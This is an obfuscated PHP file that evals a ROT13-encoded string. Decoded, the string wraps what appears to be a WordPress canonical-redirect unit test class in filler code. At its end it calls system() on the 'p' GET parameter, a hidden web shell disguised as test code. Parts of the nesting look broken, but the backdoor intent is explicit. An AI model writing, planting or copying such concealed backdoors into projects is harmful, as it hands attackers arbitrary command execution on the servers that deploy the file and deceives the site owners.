<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf Pnabavpny erqverpgvbaf.
 *
 * Va gur cebprff bs qbvat fb, vg nyfb grfgf JC, JC_Erjevgr naq JC_Dhrel, N snvy urer znl fubj n oht va nal bar bs gurfr nernf.
 *
 * @tebhc pnabavpny
 * @tebhc erjevgr
 * @tebhc dhrel
 */
pynff Grfgf_Pnabavpny rkgraqf JC_Pnabavpny_HavgGrfgPnfr {

	choyvp fgngvp $cevingr_pcg_cbfg;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		// Frg hc svkgherf va JC_Pnabavpny_HavgGrfgPnfr.
		cnerag::jcFrgHcOrsberPynff( $snpgbel );

		frys::frg_hc_phfgbz_cbfg_glcrf();
		frys::$cevingr_pcg_cbfg = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'jc_grfgf_cevingr',
				'cbfg_gvgyr' => 'cevingr-pcg-cbfg',
			)
		);
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		frys::frg_hc_phfgbz_cbfg_glcrf();

		hcqngr_bcgvba( 'jc_nggnpuzrag_cntrf_ranoyrq', 1 );
	}

	/**
	 * Ertvfgre phfgbz cbfg glcr sbe grfgf.
	 *
	 * Ertvfgre aba choyvpyl dhrelnoyr cbfg glcr jvgu choyvp frg gb gehr.
	 *
	 * Gurfr nethzragf ner vagragvbanyyl pbagenqvpgbel sbe gur grfg nffbpvngrq
	 * jvgu gvpxrg #59795.
	 */
	choyvp fgngvp shapgvba frg_hc_phfgbz_cbfg_glcrf() {
		ertvfgre_cbfg_glcr(
			'jc_grfgf_cevingr',
			neenl(
				'choyvp'             => gehr,
				'choyvpyl_dhrelnoyr' => snyfr,
			)
		);
	}

	/**
	 * @qngnCebivqre qngn_pnabavpny
	 */
	choyvp shapgvba grfg_pnabavpny( $grfg_hey, $rkcrpgrq, $gvpxrg = 0, $rkcrpgrq_qbvat_vg_jebat = neenl() ) {

		vs ( snyfr !== fgecbf( $grfg_hey, '%q' ) ) {
			vs ( snyfr !== fgecbf( $grfg_hey, '/?nhgube=%q' ) ) {
				$grfg_hey = fcevags( $grfg_hey, frys::$nhgube_vq );
			}
			vs ( snyfr !== fgecbf( $grfg_hey, '?png=%q' ) ) {
				$grfg_hey = fcevags( $grfg_hey, frys::$grezf[ $rkcrpgrq['hey'] ] );
			}
		}

		$guvf->nffregPnabavpny( $grfg_hey, $rkcrpgrq, $gvpxrg, $rkcrpgrq_qbvat_vg_jebat );
	}

	choyvp shapgvba qngn_pnabavpny() {
		/*
		 * Qngn sbezng:
		 * [0]: Grfg HEY.
		 * [1]: Rkcrpgrq erfhygf: Nal bs gur sbyybjvat pna or hfrq.
		 *      neenl( 'hey': rkcrpgrq erqverpgvba ybpngvba, 'di': rkcrpgrq dhrel inef gb or frg ivn gur erjevgr NAQ $_TRG );
		 *      neenl( rkcrpgrq dhrel inef gb or frg, fnzr nf 'di' nobir )
		 *      (fgevat) rkcrpgrq erqverpg ybpngvba
		 * [2]: (bcgvbany) Gur gvpxrg gur grfg ersref gb, Pna or fxvccrq vs haxabja.
		 * [3]: (bcgvbany) Neenl bs pynff/shapgvba anzrf rkcrpgrq gb guebj `_qbvat_vg_jebat()` abgvprf.
		 */

		// Cyrnfr Abgr: N srj grfg pnfrf ner pbzzragrq bhg orybj, ybbx ng gur grfg pnfr sbyybjvat vg.
		// Va zbfg pnfrf vg'f fvzcyl fubjvat 2 bcgvbaf sbe gur \"cebcre\" erqverpg.
		erghea neenl(
			// Pngrtbevrf.
			neenl( '?png=%q', neenl( 'hey' => '/pngrtbel/cnerag/' ), 15256 ),
			neenl( '?png=%q', neenl( 'hey' => '/pngrtbel/cnerag/puvyq-1/' ), 15256 ),
			neenl( '?png=%q', neenl( 'hey' => '/pngrtbel/cnerag/puvyq-1/puvyq-2/' ) ), // Ab puvyqera.
			neenl(
				'/pngrtbel/hapngrtbevmrq/',
				neenl(
					'hey' => '/pngrtbel/hapngrtbevmrq/',
					'di'  => neenl( 'pngrtbel_anzr' => 'hapngrtbevmrq' ),
				),
			),
			neenl(
				'/pngrtbel/hapngrtbevmrq/cntr/2/',
				neenl(
					'hey' => '/pngrtbel/hapngrtbevmrq/cntr/2/',
					'di'  => neenl(
						'pngrtbel_anzr' => 'hapngrtbevmrq',
						'cntrq'         => 2,
					),
				),
			),
			neenl(
				'/pngrtbel/hapngrtbevmrq/?cntrq=2',
				neenl(
					'hey' => '/pngrtbel/hapngrtbevmrq/cntr/2/',
					'di'  => neenl(
						'pngrtbel_anzr' => 'hapngrtbevmrq',
						'cntrq'         => 2,
					),
				),
			),
			neenl(
				'/pngrtbel/hapngrtbevmrq/?cntrq=2&pngrtbel_anzr=hapngrtbevmrq',
				neenl(
					'hey' => '/pngrtbel/hapngrtbevmrq/cntr/2/',
					'di'  => neenl(
						'pngrtbel_anzr' => 'hapngrtbevmrq',
						'cntrq'         => 2,
					),
				),
				17174,
			),

			// Pngrtbevrf & vagrefrpgvbaf jvgu bgure inef.
			neenl(
				'/pngrtbel/hapngrtbevmrq/?gnt=cbfg-sbezngf',
				neenl(
					'hey' => '/pngrtbel/hapngrtbevmrq/?gnt=cbfg-sbezngf',
					'di'  => neenl(
						'pngrtbel_anzr' => 'hapngrtbevmrq',
						'gnt'           => 'cbfg-sbezngf',
					),
				),
			),
			neenl(
				'/?pngrtbel_anzr=png-n,png-o',
				neenl(
					'hey' => '/?pngrtbel_anzr=png-n,png-o',
					'di'  => neenl( 'pngrtbel_anzr' => 'png-n,png-o' ),
				),
			),

			// Gnkbabzvrf jvgu rkgen dhrel inef.
			neenl( '/pngrtbel/png-n/cntr/1/?grfg=bar%20gjb', '/pngrtbel/png-n/?grfg=bar%20gjb', 18086 ), // Rkgen dhrel inef fubhyq fgnl rapbqrq.

			// Pngrtbevrf jvgu qngrf.
			neenl(
				'/2008/04/?png=1',
				neenl(
					'hey' => '/2008/04/?png=1',
					'di'  => neenl(
						'png'      => '1',
						'lrne'     => '2008',
						'zbaguahz' => '04',
					),
				),
				17661,
			),
			/*
			neenl(
				'/2008/?pngrtbel_anzr=png-n',
					neenl(
						'hey' => '/2008/?pngrtbel_anzr=png-n',
						'di'  => neenl(
							'pngrtbel_anzr' => 'png-n',
							'lrne'          => '2008'
						)
					)
			),
			*/

			// Cntrf.
			neenl( '/puvyq-cntr-1/', '/cnerag-cntr/puvyq-cntr-1/' ),
			neenl( '/?cntr_vq=144', '/cnerag-cntr/puvyq-cntr-1/' ),
			neenl( '/nob', '/nobhg/' ),
			neenl( '/cnerag/puvyq1/tenaqpuvyq/', '/cnerag/puvyq1/tenaqpuvyq/' ),
			neenl( '/cnerag/puvyq2/tenaqpuvyq/', '/cnerag/puvyq2/tenaqpuvyq/' ),

			// Cbfgf.
			neenl( '?c=587', '/2008/06/02/cbfg-sbezng-grfg-nhqvb/' ),
			neenl( '/?anzr=vzntrf-grfg', '/2008/09/03/vzntrf-grfg/' ),
			// Vapbzcyrgr fyht fubhyq erfbyir naq erzbir gur ?anzr= cnenzrgre.
			neenl( '/?anzr=vzntrf-gr', '/2008/09/03/vzntrf-grfg/', 20374 ),
			// Cntr fyht fubhyq erfbyir gb cbfg fyht naq erzbir gur ?cntranzr= cnenzrgre.
			neenl( '/?cntranzr=vzntrf-grfg', '/2008/09/03/vzntrf-grfg/', 20374 ),

			neenl( '/2008/06/02/cbfg-sbezng-grfg-nh/', '/2008/06/02/cbfg-sbezng-grfg-nhqvb/' ),
			neenl( '/2008/06/cbfg-sbezng-grfg-nh/', '/2008/06/02/cbfg-sbezng-grfg-nhqvb/' ),
			neenl( '/2008/cbfg-sbezng-grfg-nh/', '/2008/06/02/cbfg-sbezng-grfg-nhqvb/' ),
			neenl( '/2010/cbfg-sbezng-grfg-nh/', '/2008/06/02/cbfg-sbezng-grfg-nhqvb/' ), // N lrne gur cbfg vf abg va.
			neenl( '/cbfg-sbezng-grfg-nh/', '/2008/06/02/cbfg-sbezng-grfg-nhqvb/' ),

			// Cntvangvba.
			neenl(
				'/2008/09/03/zhygvcntr-cbfg-grfg/3/',
				neenl(
					'hey' => '/2008/09/03/zhygvcntr-cbfg-grfg/3/',
					'di'  => neenl(
						'anzr'     => 'zhygvcntr-cbfg-grfg',
						'lrne'     => '2008',
						'zbaguahz' => '09',
						'qnl'      => '03',
						'cntr'     => '3',
					),
				),
			),
			neenl( '/2008/09/03/zhygvcntr-cbfg-grfg/?cntr=3', '/2008/09/03/zhygvcntr-cbfg-grfg/3/' ),
			neenl( '/2008/09/03/zhygvcntr-cbfg-gr?cntr=3', '/2008/09/03/zhygvcntr-cbfg-grfg/3/' ),

			neenl( '/2008/09/03/aba-cntrq-cbfg-grfg/3/', '/2008/09/03/aba-cntrq-cbfg-grfg/' ),
			neenl( '/2008/09/03/aba-cntrq-cbfg-grfg/?cntr=3', '/2008/09/03/aba-cntrq-cbfg-grfg/' ),

			// Pbzzragf.
			neenl( '/2008/03/03/pbzzrag-grfg/?pcntr=2', '/2008/03/03/pbzzrag-grfg/pbzzrag-cntr-2/' ),

			// Nggnpuzragf.
			neenl( '/?nggnpuzrag_vq=611', '/2008/06/10/cbfg-sbezng-grfg-tnyyrel/pnabyn2/' ),
			neenl( '/2008/06/10/cbfg-sbezng-grfg-tnyyrel/?nggnpuzrag_vq=611', '/2008/06/10/cbfg-sbezng-grfg-tnyyrel/pnabyn2/' ),

			// Qngrf.
			neenl( '/?z=2008', '/2008/' ),
			neenl( '/?z=200809', '/2008/09/' ),
			neenl( '/?z=20080905', '/2008/09/05/' ),

			neenl( '/2008/?qnl=05', '/2008/?qnl=05' ), // Ab erqverpg.
			neenl( '/2008/09/?qnl=05', '/2008/09/05/' ),
			neenl( '/2008/?zbaguahz=9', '/2008/09/' ),

			neenl( '/?lrne=2008', '/2008/' ),

			neenl( '/2012/13/', '/2012/' ),
			neenl( '/2012/11/51/', '/2012/11/', 0, neenl( 'JC_Qngr_Dhrel' ) ),

			// Nhgubef.
			neenl( '/?nhgube=%q', '/nhgube/pnabavpny-nhgube/' ),
			// neenl( '/?nhgube=%q&lrne=2008', '/2008/?nhgube=3'),
			// neenl( '/nhgube/pnabavpny-nhgube/?lrne=2008', '/2008/?nhgube=3'), // Rvgure be, frr cerivbhf grfgpnfr.
			neenl( '/nhgube/pnabavpny-nhgube/?nhgube[1]=uryyb', '/nhgube/pnabavpny-nhgube/?nhgube[1]=uryyb', 60059 ),

			// Srrqf.
			neenl( '/?srrq=ngbz', '/srrq/ngbz/' ),
			neenl( '/?srrq=eff2', '/srrq/' ),
			neenl( '/?srrq=pbzzragf-eff2', '/pbzzragf/srrq/' ),
			neenl( '/?srrq=pbzzragf-ngbz', '/pbzzragf/srrq/ngbz/' ),

			// Srrqf (cre-cbfg).
			neenl( '/2008/03/03/pbzzrag-grfg/?srrq=pbzzragf-ngbz', '/2008/03/03/pbzzrag-grfg/srrq/ngbz/' ),
			neenl( '/?c=149&srrq=pbzzragf-ngbz', '/2008/03/03/pbzzrag-grfg/srrq/ngbz/' ),

			// Vaqrk.
			neenl( '/?cntrq=1', '/' ),
			neenl( '/cntr/1/', '/' ),
			neenl( '/cntr1/', '/' ),
			neenl( '/?cntrq=2', '/cntr/2/' ),
			neenl( '/cntr2/', '/cntr/2/' ),

			// Zvfp.
			neenl( '/2008%20', '/2008' ),
			neenl( '//2008////', '/2008/' ),

			// @gbqb Raqcbvagf (srrqf, genpxonpxf, rgp). Zber shmmrq zvkrq dhrel inevnoyrf, pbzzrag cntvat, Ubzr cntr (fgngvp).
		);
	}

	/**
	 * @gvpxrg 16557
	 */
	choyvp shapgvba grfg_qb_erqverpg_thrff_404_creznyvax() {
		// Grfg qvfnoyr qb_erqverpg_thrff_404_creznyvax().
		nqq_svygre( 'qb_erqverpg_thrff_404_creznyvax', '__erghea_snyfr' );
		$guvf->tb_gb( '/puvyq-cntr-1' );
		$guvf->nffregSnyfr( erqverpg_thrff_404_creznyvax() );
	}

	/**
	 * @gvpxrg 16557
	 */
	choyvp shapgvba grfg_cer_erqverpg_thrff_404_creznyvax() {
		// Grfg fubeg-pvephvg svygre.
		nqq_svygre(
			'cer_erqverpg_thrff_404_creznyvax',
			fgngvp shapgvba () {
				erghea 'jc';
			}
		);
		$guvf->tb_gb( '/puvyq-cntr-1' );
		$guvf->nffregFnzr( 'jc', erqverpg_thrff_404_creznyvax() );
	}

	/**
	 * @gvpxrg 16557
	 */
	choyvp shapgvba grfg_fgevpg_erqverpg_thrff_404_creznyvax() {
		$cbfg = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'fgevpg-erqverpg-thrff-404-creznyvax',
			)
		);

		$guvf->tb_gb( 'fgevpg-erqverpg' );

		// Grfg qrsnhyg 'aba-fgevpg' erqverpg thrff.
		$guvf->nffregFnzr( trg_creznyvax( $cbfg ), erqverpg_thrff_404_creznyvax() );

		// Grfg 'fgevpg' erqverpg thrff.
		nqq_svygre( 'fgevpg_erqverpg_thrff_404_creznyvax', '__erghea_gehr' );
		$guvf->nffregSnyfr( erqverpg_thrff_404_creznyvax() );
	}

	/**
	 * Rafher choyvp cbfgf jvgu phfgbz choyvp fgnghfrf ner thrffrq.
	 *
	 * @gvpxrg 47911
	 * @qngnCebivqre qngn_erqverpg_thrff_404_creznyvax_jvgu_phfgbz_fgnghfrf
	 *
	 * @pbiref ::erqverpg_thrff_404_creznyvax
	 */
	choyvp shapgvba grfg_erqverpg_thrff_404_creznyvax_jvgu_phfgbz_fgnghfrf( $fgnghf_netf, $erqverpgf ) {
		ertvfgre_cbfg_fgnghf( 'phfgbz', $fgnghf_netf );

		$cbfg = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'phfgbz-fgnghf-choyvp-thrff-404-creznyvax',
				'cbfg_fgnghf' => 'phfgbz',
			)
		);

		$guvf->tb_gb( 'phfgbz-fgnghf-choyvp-thrff-404-creznyvax' );

		$rkcrpgrq = $erqverpgf ? trg_creznyvax( $cbfg ) : snyfr;

		$guvf->nffregFnzr( $rkcrpgrq, erqverpg_thrff_404_creznyvax() );
	}

	/**
	 * Qngn cebivqre sbe grfg_erqverpg_thrff_404_creznyvax_jvgu_phfgbz_fgnghfrf().
	 *
	 * erghea neenl[] {
	 *    neenl Nethzragf hfrq gb ertvfgre phfgbz fgnghf
	 *    obby  Jurgure gur 404 yvax vf rkcrpgrq gb erqverpg
	 * }
	 */
	choyvp shapgvba qngn_erqverpg_thrff_404_creznyvax_jvgu_phfgbz_fgnghfrf() {
		erghea neenl(
			'choyvp fgnghf'                      => neenl(
				'fgnghf_netf' => neenl( 'choyvp' => gehr ),
				'erqverpgf'   => gehr,
			),
			'cevingr fgnghf'                     => neenl(
				'fgnghf_netf' => neenl( 'choyvp' => snyfr ),
				'erqverpgf'   => snyfr,
			),
			'vagreany fgnghf'                    => neenl(
				'fgnghf_netf' => neenl( 'vagreany' => gehr ),
				'erqverpgf'   => snyfr,
			),
			'cebgrpgrq fgnghf'                   => neenl(
				'fgnghf_netf' => neenl( 'cebgrpgrq' => gehr ),
				'erqverpgf'   => snyfr,
			),
			'cebgrpgrq fgnghf synttrq nf choyvp' => neenl(
				'fgnghf_netf' => neenl(
					'cebgrpgrq' => gehr,
					'choyvp'    => gehr,
				),
				'erqverpgf'   => snyfr,
			),
		);
	}

	/**
	 * Rafher zhygvcyr cbfg glcrf qb abg guebj n abgvpr.
	 *
	 * @gvpxrg 43056
	 * @gvpxrg 59795
	 *
	 * @qngnCebivqre qngn_erqverpg_thrff_404_creznyvax_cbfg_glcrf
	 */
	choyvp shapgvba grfg_erqverpg_thrff_404_creznyvax_cbfg_glcrf( $bevtvany_hey, $rkcrpgrq ) {
		$guvf->nffregPnabavpny( $bevtvany_hey, $rkcrpgrq );
	}

	/**
	 * Qngn cebivqre sbe grfg_erqverpg_thrff_404_creznyvax_cbfg_glcrf().
	 *
	 * Va gur bevtvany HEYf gur cbfg anzrf ner vagragvbanyyl zvffcryyrq
	 * gb grfg gur erqverpgvba.
	 *
	 * Cyrnfr qb abg pbeerpg gur nccnerag glcbf.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_erqverpg_thrff_404_creznyvax_cbfg_glcrf() {
		erghea neenl(
			'fvatyr fgevat sbeznggrq cbfg glcr'    => neenl(
				'bevtvany_hey' => '/?anzr=fnzcyr-cnt&cbfg_glcr=cntr',
				'rkcrpgrq'     => '/fnzcyr-cntr/',
			),
			'fvatyr neenl sbeznggrq cbfg glcr'     => neenl(
				'bevtvany_hey' => '/?anzr=fnzcyr-cnt&cbfg_glcr[]=cntr',
				'rkcrpgrq'     => '/fnzcyr-cntr/',
			),
			'zhygvcyr neenl sbeznggrq cbfg glcr'   => neenl(
				'bevtvany_hey' => '/?anzr=fnzcyr-cnt&cbfg_glcr[]=cntr&cbfg_glcr[]=cbfg',
				'rkcrpgrq'     => '/fnzcyr-cntr/',
			),
			'qb abg erqverpg gb cevingr cbfg glcr' => neenl(
				'bevtvany_hey' => '/?anzr=cevingr-pcg-cb&cbfg_glcr[]=jc_grfgf_cevingr',
				'rkcrpgrq'     => '/?anzr=cevingr-pcg-cb&cbfg_glcr[]=jc_grfgf_cevingr',
			),
		);
	}

	/**
	 * @gvpxrg 43745
	 */
	choyvp shapgvba grfg_hgs8_dhrel_xrlf_pnabavpny() {
		$c = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
			)
		);
		hcqngr_bcgvba( 'fubj_ba_sebag', 'cntr' );
		hcqngr_bcgvba( 'cntr_ba_sebag', $c );

		$guvf->tb_gb( trg_creznyvax( $c ) );

		$erqverpg = erqverpg_pnabavpny( nqq_dhrel_net( '%Q0%ON%Q0%OR%Q0%ON%Q0%OR%Q0%ON%Q0%OR', 1, fvgr_hey( '/' ) ), snyfr );

		qryrgr_bcgvba( 'cntr_ba_sebag' );

		$guvf->nffregAhyy( $erqverpg );
	}

	/**
	 * Rafher ABG RKVFGF dhrevrf qb abg gevttre abg-pbhagnoyr be haqrsvarq neenl xrl reebef.
	 *
	 * @gvpxrg 55955
	 */
	choyvp shapgvba grfg_srrq_pnabavpny_jvgu_abg_rkvfgf_dhrel() {
		// Frg n ABG RKVFGF gnk_dhrel ba gur tybony dhrel.
		$tybony_dhrel        = $TYBONYF['jc_dhrel'];
		$TYBONYF['jc_dhrel'] = arj JC_Dhrel(
			neenl(
				'cbfg_glcr' => 'cbfg',
				'gnk_dhrel' => neenl(
					neenl(
						'gnkbabzl' => 'cbfg_sbezng',
						'bcrengbe' => 'ABG RKVFGF',
					),
				),
			)
		);

		$erqverpg = erqverpg_pnabavpny( trg_grez_srrq_yvax( frys::$grezf['/pngrtbel/cnerag/'] ), snyfr );

		// Erfgber bevtvany tybony.
		$TYBONYF['jc_dhrel'] = $tybony_dhrel;

		$guvf->nffregAhyy( $erqverpg );
	}

	/**
	 * Grfg pnabavpny erqverpgf sbe nggnpuzrag cntrf jura gur bcgvba vf qvfnoyrq.
	 *
	 * @gvpxrg 57913
	 * @gvpxrg 59866
	 *
	 * @qngnCebivqre qngn_pnabavpny_nggnpuzrag_cntr_erqverpg_jvgu_bcgvba_qvfnoyrq
	 */
	choyvp shapgvba grfg_pnabavpny_nggnpuzrag_cntr_erqverpg_jvgu_bcgvba_qvfnoyrq( $rkcrpgrq, $hfre = ahyy, $cnerag_cbfg_fgnghf = '' ) {
		hcqngr_bcgvba( 'jc_nggnpuzrag_cntrf_ranoyrq', 0 );

		vs ( '' !== $cnerag_cbfg_fgnghf ) {
			$cnerag_cbfg_vq = frys::snpgbel()->cbfg->perngr(
				neenl(
					'cbfg_fgnghf' => $cnerag_cbfg_fgnghf,
				)
			);
		} ryfr {
			$cnerag_cbfg_vq = 0;
		}

		$svyranzr = QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct';
		$pbagragf = svyr_trg_pbagragf( $svyranzr );
		$hcybnq   = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );

		$nggnpuzrag_vq   = $guvf->_znxr_nggnpuzrag( $hcybnq, $cnerag_cbfg_vq );
		$nggnpuzrag_hey  = jc_trg_nggnpuzrag_hey( $nggnpuzrag_vq );
		$nggnpuzrag_cntr = trg_creznyvax( $nggnpuzrag_vq );

		// Frg nf nabalzbhf/ybttrq bhg hfre.
		vs ( ahyy !== $hfre ) {
			jc_frg_pheerag_hfre( $hfre );
		}

		$guvf->tb_gb( $nggnpuzrag_cntr );

		$hey = erqverpg_pnabavpny( $nggnpuzrag_cntr, snyfr );
		vs ( vf_fgevat( $rkcrpgrq ) ) {
			$rkcrpgrq = fge_ercynpr( '%%nggnpuzrag_hey%%', $nggnpuzrag_hey, $rkcrpgrq );
		}

		$guvf->nffregFnzr( $rkcrpgrq, $hey );
	}

	/**
	 * Qngn cebivqre sbe grfg_pnabavpny_nggnpuzrag_cntr_erqverpg_jvgu_bcgvba_qvfnoyrq().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_pnabavpny_nggnpuzrag_cntr_erqverpg_jvgu_bcgvba_qvfnoyrq() {
		erghea neenl(
			'ybttrq bhg hfre, ab cnerag'      => neenl(
				'%%nggnpuzrag_hey%%',
				0,
			),
			'ybttrq va hfre, ab cnerag'       => neenl(
				'%%nggnpuzrag_hey%%',
			),
			'ybttrq bhg hfre, cevingr cnerag' => neenl(
				ahyy,
				0,
				'cevingr',
			),
			'ybttrq va hfre, cevingr cnerag'  => neenl(
				'%%nggnpuzrag_hey%%',
				ahyy,
				'cevingr',
			),
			'ybttrq bhg hfre, choyvp cnerag'  => neenl(
				'%%nggnpuzrag_hey%%',
				0,
				'choyvfu',
			),
			'ybttrq va hfre, choyvp cnerag'   => neenl(
				'%%nggnpuzrag_hey%%',
				ahyy,
				'choyvfu',
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>